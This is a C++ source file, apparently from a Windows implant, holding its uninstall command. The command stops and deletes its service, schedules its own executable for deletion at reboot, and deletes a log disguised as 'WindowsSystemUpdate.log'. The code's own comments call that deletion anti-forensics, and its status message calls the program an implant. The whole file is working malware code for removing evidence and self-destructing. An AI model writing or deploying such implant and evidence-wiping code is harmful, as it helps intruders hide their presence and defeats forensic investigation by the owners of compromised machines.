#include "cleaner.h"
#include "config.h"
#include "error.h"
#include "log.h"
#include "service.h"
#include <windows.h>
#include <string>


std::string cmd_uninstall() {
    std::string result;

    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) {
        result = format_last_error("OpenSCManager");
        return result;
    }

    SC_HANDLE service = OpenServiceW(scm, ServiceNameW,
        SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
    if (!service) {
        const DWORD err = GetLastError();
        if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
            result = "Service deja absent.";
        }
        else {
            result = format_error(err, "OpenService");
            CloseServiceHandle(scm);
            return result;
        }
    }
    else {
        SERVICE_STATUS status{};
        if (ControlService(service, SERVICE_CONTROL_STOP, &status)) {
            result = "Arret du service demande.";
            // Attente bornée (5 s) : le SCM prend le relais sinon.
            for (int i = 0; i < 50; ++i) {
                SERVICE_STATUS_PROCESS sp{};
                DWORD needed = 0;
                if (!QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO,
                        reinterpret_cast<LPBYTE>(&sp), sizeof(sp), &needed)) break;
                if (sp.dwCurrentState == SERVICE_STOPPED) break;
                Sleep(100);
            }
        }
        else if (GetLastError() == ERROR_SERVICE_NOT_ACTIVE) {
            result = "Service deja arrete.";
        }
        else {
            result = format_last_error("ControlService(STOP)");
        }

        if (DeleteService(service)) {
            result += "\nService marque pour suppression.";
        }
        else {
            result += "\nEchec DeleteService : " +
                format_error(GetLastError(), "DeleteService");
        }

        CloseServiceHandle(service);
    }
    CloseServiceHandle(scm);

    // Suppression du binaire au reboot (le processus courant le verrouille encore).
    char exe_path[MAX_PATH] = {};
    if (GetModuleFileNameA(nullptr, exe_path, MAX_PATH) != 0) {
        if (MoveFileExA(exe_path, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT)) {
            result += "\nExecutable supprime au prochain redemarrage.";
        }
        else {
            result += "\nEchec MoveFileEx : " +
                format_error(GetLastError(), "MoveFileEx");
        }
    }

    // Nettoyage preventif de l'ancien fichier de log (anti-forensics).
    char program_data[MAX_PATH] = {};
    if (GetEnvironmentVariableA("ProgramData", program_data, sizeof(program_data))) {
        std::string old_log = std::string(program_data) + "\\WindowsSystemUpdate.log";
        DeleteFileA(old_log.c_str());
    }

    result += "\nArret de l'implant demande.";
    request_self_stop();
    return result;
}